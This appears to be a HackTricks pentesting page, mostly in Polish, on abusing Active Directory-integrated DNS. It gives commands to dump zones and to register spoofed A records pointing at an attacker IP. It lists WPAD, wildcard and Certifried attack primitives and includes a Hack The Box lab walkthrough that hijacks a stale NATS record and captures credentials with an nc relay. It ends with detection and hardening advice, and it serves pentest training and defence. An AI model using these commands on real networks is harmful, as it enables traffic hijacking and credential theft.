# Rekordy DNS w AD

{{#include ../../banners/hacktricks-training.md}}

Domyślnie **każdy użytkownik** w Active Directory może **enumerate all DNS records** w strefach DNS Domain lub Forest, podobnie jak przy zone transfer (użytkownicy mogą wyświetlać obiekty potomne strefy DNS w środowisku AD).

Narzędzie [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) umożliwia **enumeration** i **eksport** **wszystkich rekordów DNS** w strefie w celach recon sieci wewnętrznych.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) dodaje JSON/Greppable (`--json`) wyjście, wielowątkowe rozwiązywanie DNS oraz obsługę TLS 1.2/1.3 przy łączeniu do LDAPS

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Tworzenie / Modyfikowanie rekordów (ADIDNS spoofing)

Because the **Authenticated Users** group has **Create Child** on the zone DACL by default, any domain account (or computer account) can register additional records.  This can be used for traffic hijacking, NTLM relay coercion or even full domain compromise.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py jest dostarczany z Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Typowe prymitywy ataku

1. **Wildcard record** – `*.<zone>` zamienia serwer AD DNS w responder obejmujący całe przedsiębiorstwo, podobny do LLMNR/NBNS spoofing. Może być nadużyty do przechwytywania hashy NTLM lub do przekazania ich do LDAP/SMB. (Wymaga wyłączenia WINS-lookup.)
2. **WPAD hijack** – dodaj `wpad` (lub rekord **NS** wskazujący na hosta atakującego, aby obejść Global-Query-Block-List) i transparentnie proxyuj wychodzące żądania HTTP, aby zebrać poświadczenia. Microsoft załatał wildcard/DNAME bypasses (CVE-2018-8320), ale **NS-records nadal działają**.
3. **Stale entry takeover** – przejmij adres IP, który wcześniej należał do stacji roboczej, a powiązany wpis DNS nadal będzie rozwiązywany, umożliwiając resource-based constrained delegation lub Shadow-Credentials attacks bez jakiejkolwiek ingerencji w DNS.
4. **DHCP → DNS spoofing** – w domyślnej instalacji Windows z DHCP+DNS nieautoryzowany atakujący w tej samej podsieci może nadpisać dowolny istniejący rekord A (w tym Domain Controllers) wysyłając sfałszowane żądania DHCP, które wywołują dynamiczne aktualizacje DNS (Akamai “DDSpoof”, 2023). To daje machine-in-the-middle nad Kerberos/LDAP i może prowadzić do przejęcia całej domeny.
5. **Certifried (CVE-2022-26923)** – zmień `dNSHostName` konta maszyny, które kontrolujesz, zarejestruj odpowiadający rekord A, a następnie wystąp o certyfikat dla tej nazwy, aby podszyć się pod DC. Narzędzia takie jak **Certipy** czy **BloodyAD** w pełni automatyzują ten proces.

---

### Przejęcie usług wewnętrznych przez przestarzałe rekordy dynamiczne (studium przypadku NATS)

Kiedy dynamiczne aktualizacje są otwarte dla wszystkich uwierzytelnionych użytkowników, **wyrejestrowana nazwa usługi może zostać ponownie przejęta i skierowana do infrastruktury atakującego**. Mirage HTB DC ujawnił nazwę hosta `nats-svc.mirage.htb` po DNS scavenging, więc każdy użytkownik o niskich uprawnieniach mógł:

1. **Potwierdź, że rekord jest nieobecny** i poznaj SOA za pomocą `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Odtwórz rekord** wskazując na zewnętrzny interfejs/VPN, którym dysponują:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Podszyj się pod plaintext service**. Klienci NATS oczekują, że zobaczą jedno `INFO { ... }` banner przed wysłaniem poświadczeń, więc skopiowanie prawidłowego baneru z prawdziwego brokera wystarczy, aby pozyskać sekrety:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Każdy klient, który rozwiąże przejętą nazwę, natychmiast leak'uje swój JSON `CONNECT` frame (w tym `"user"`/`"pass"`) do listenera. Uruchomienie oficjalnego binarki `nats-server -V` na hoście atakującego, wyłączenie redakcji logów lub po prostu sniffowanie sesji za pomocą Wireshark skutkuje ujawnieniem tych samych plaintext credentials, ponieważ TLS był opcjonalny.

4. **Pivot with the captured creds** – w Mirage skradzione konto NATS zapewniło dostęp do JetStream, który ujawnił historyczne zdarzenia uwierzytelniania zawierające możliwe do ponownego użycia AD usernames/passwords.

Ten schemat dotyczy każdej usługi zintegrowanej z AD, która polega na niechronionych handshake'ach TCP (HTTP APIs, RPC, MQTT, itd.): po przejęciu rekordu DNS atakujący staje się usługą.

---

## Wykrywanie i zabezpieczenia

* Zabroń **Authenticated Users** prawa *Create all child objects* na wrażliwych strefach i deleguj dynamiczne aktualizacje do dedykowanego konta używanego przez DHCP.
* Jeśli wymagane są dynamiczne aktualizacje, ustaw strefę na **Secure-only** i włącz **Name Protection** w DHCP, aby tylko obiekt komputera-właściciela mógł nadpisać własny rekord.
* Monitoruj DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) oraz zapisy LDAP do `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Zablokuj niebezpieczne nazwy (`wpad`, `isatap`, `*`) za pomocą celowo nieszkodliwego rekordu lub poprzez Global Query Block List.
* Utrzymuj serwery DNS załatane – np. błędy RCE CVE-2024-26224 i CVE-2024-26231 osiągnęły **CVSS 9.8** i są zdalnie wykorzystywalne przeciwko kontrolerom domeny.

## Referencje

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, nadal de facto referencja dla wildcard/WPAD ataków)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
